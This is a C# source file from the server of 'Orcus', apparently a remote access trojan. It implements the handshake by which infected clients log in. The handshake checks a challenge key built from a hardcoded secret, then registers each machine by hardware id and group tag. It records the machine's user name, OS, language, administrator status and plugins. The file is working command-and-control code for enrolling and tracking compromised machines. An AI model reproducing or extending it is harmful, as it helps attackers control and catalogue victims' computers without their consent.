using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Security;
using NLog;
using Orcus.Server.Core.Database;
using Orcus.Shared.Communication;
using Orcus.Shared.Connection;
using Orcus.Shared.NetSerializer;

namespace Orcus.Server.Core.ClientAcceptor
{
    public class ClientAcceptor3 : IClientAcceptor
    {
        private static readonly Logger Logger = LogManager.GetCurrentClassLogger();
        private static readonly Random Random = new Random();
        private readonly DatabaseManager _databaseManager;

        public ClientAcceptor3(DatabaseManager databaseManager)
        {
            _databaseManager = databaseManager;
        }

        public int ApiVersion { get; } = 3;

        public bool LogIn(SslStream sslStream, BinaryReader binaryReader, BinaryWriter binaryWriter,
            out ClientData clientData, out CoreClientInformation coreClientInformation, out bool isNewClient)
        {
            clientData = null;
            coreClientInformation = null;
            isNewClient = false;

            Logger.Debug("Send key request");

            binaryWriter.Write((byte) AuthentificationFeedback.GetKey);
            var keys = new KeyDatabase();
            var index = Random.Next(keys.Length);
            var key = keys.GetKey(index,
                "@=<VY]BUQM{sp&hH%xbLJcUd/2sWgR+YA&-_Z>/$skSXZR!:(yZ5!>t>ZxaPTrS[Z/'R,ssg'.&4yZN?S)My+:QV2(c&x/TU]Yq2?g?*w7*r@pmh");
            binaryWriter.Write(index);
            var result = binaryReader.ReadString();

            if (key != result)
            {
                binaryWriter.Write((byte) AuthentificationFeedback.InvalidKey);
                Logger.Info("Invalid key - denied");
                return false;
            }

            Logger.Debug("Valid key. Get hardware id");

            binaryWriter.Write((byte) AuthentificationFeedback.GetHardwareId);
            var hardwareId = binaryReader.ReadString();
            if (hardwareId.Length > 256)
            {
                Logger.Info("Client rejected because the hardware id was too long. Length: {0}, MaxLength: 256",
                    hardwareId.Length);
                return false;
            }

            Logger.Debug("Hardware id received: {0}", hardwareId);
            Logger.Debug("Get client from database...");

            var knowClient = _databaseManager.GetClient(hardwareId, out clientData);
            string clientTag = null;

            Logger.Debug(knowClient ? "Client was already registered" : "Seems like a new client");

            if (knowClient)
            {
                Logger.Debug("Client accepted");
                binaryWriter.Write((byte) AuthentificationFeedback.Accepted);
            }
            else
            {
                Logger.Debug("Get client tag");
                binaryWriter.Write((byte) AuthentificationFeedback.GetClientTag);
                clientTag = binaryReader.ReadString();
                if (clientTag.Length > 256)
                {
                    Logger.Info("Client rejected because the client tag was too long. Length: {0}, MaxLength: 256",
                        clientTag.Length);
                    return false;
                }
                Logger.Debug("Client tag received: {0}. Client accepted", clientTag);
                binaryWriter.Write((byte) AuthentificationFeedback.Accepted);
            }

            var serializer = new Serializer(typeof (BasicComputerInformation));
            Logger.Debug("Attempt to deserialize BasicComputerInformation");
            var basicComputerInformation = (BasicComputerInformation) serializer.Deserialize(sslStream);
            Logger.Debug("BasicComputerInformation received, processing...");
            coreClientInformation = new CoreClientInformation
            {
                UserName = basicComputerInformation.UserName,
                OSName = basicComputerInformation.OSName,
                OSType = basicComputerInformation.OSType,
                Language = basicComputerInformation.Language,
                IsAdministrator = basicComputerInformation.IsAdministrator,
                IsServiceRunning = basicComputerInformation.IsServiceRunning,
                Plugins = basicComputerInformation.Plugins,
                LoadablePlugins = basicComputerInformation.LoadablePlugins,
                ClientConfig = null,
                ClientVersion = basicComputerInformation.ClientVersion,
                ClientPath = basicComputerInformation.ClientPath,
                ApiVersion = basicComputerInformation.ApiVersion,
                FrameworkVersion = basicComputerInformation.FrameworkVersion
            };

            Logger.Trace("Client Information:\r\n{0}", coreClientInformation);

            if (coreClientInformation.OSName.Length > 256)
            {
                Logger.Info("Client rejected because the OSName was too long. Length: {0}, MaxLength: 256",
                    coreClientInformation.OSName.Length);
                return false;
            }

            if (coreClientInformation.UserName.Length > 256)
            {
                Logger.Info("Client rejected because the UserName was too long. Length: {0}, MaxLength: 256",
                    coreClientInformation.UserName.Length);
                return false;
            }

            if (coreClientInformation.Language.Length > 32)
            {
                Logger.Info("Client rejected because the Language was too long. Length: {0}, MaxLength: 256",
                    coreClientInformation.Language.Length);
                return false;
            }

            Logger.Debug("Seems like the information is OK");

            if (knowClient)
            {
                Logger.Debug("Because the client was already registered, updating database entry");
                _databaseManager.RefreshClient(clientData.Id, coreClientInformation.UserName,
                    coreClientInformation.OSName,
                    (int) coreClientInformation.OSType, coreClientInformation.Language, null);
                clientData.UserName = coreClientInformation.UserName;
                clientData.OSName = coreClientInformation.OSName;
                clientData.OSType = coreClientInformation.OSType;
                clientData.Language = coreClientInformation.Language;
            }
            else
            {
                Logger.Info("Register client...");
                Logger.Debug("Create database entry");
                var id = _databaseManager.AddClient(coreClientInformation.UserName, hardwareId,
                    coreClientInformation.OSName,
                    (int) coreClientInformation.OSType, coreClientInformation.Language, clientTag, null);
                if (id == -1)
                {
                    Logger.Fatal("The generated id of the new client is -1");
                    return false;
                }
                clientData = new ClientData
                {
                    Id = id,
                    Language = coreClientInformation.Language,
                    HardwareId = hardwareId,
                    LastSeen = DateTime.UtcNow,
                    UserName = coreClientInformation.UserName,
                    OSType = coreClientInformation.OSType,
                    OSName = coreClientInformation.OSName,
                    Group = clientTag
                };
            }

            Logger.Debug("Client authentication successful");

            isNewClient = !knowClient;
            return true;
        }

        [Serializable]
        private class BasicComputerInformation
        {
            public string UserName { get; set; }
            public string OSName { get; set; }
            public OSType OSType { get; set; }
            public string Language { get; set; }
            public bool IsAdministrator { get; set; }
            public bool IsServiceRunning { get; set; }
            public List<PluginInfo> Plugins { get; set; }
            public List<LoadablePlugin> LoadablePlugins { get; set; }
            public string ClientConfig { get; set; }
            public int ClientVersion { get; set; }
            public string ClientPath { get; set; }
            public int ApiVersion { get; set; }
            public double FrameworkVersion { get; set; }
        }
    }
}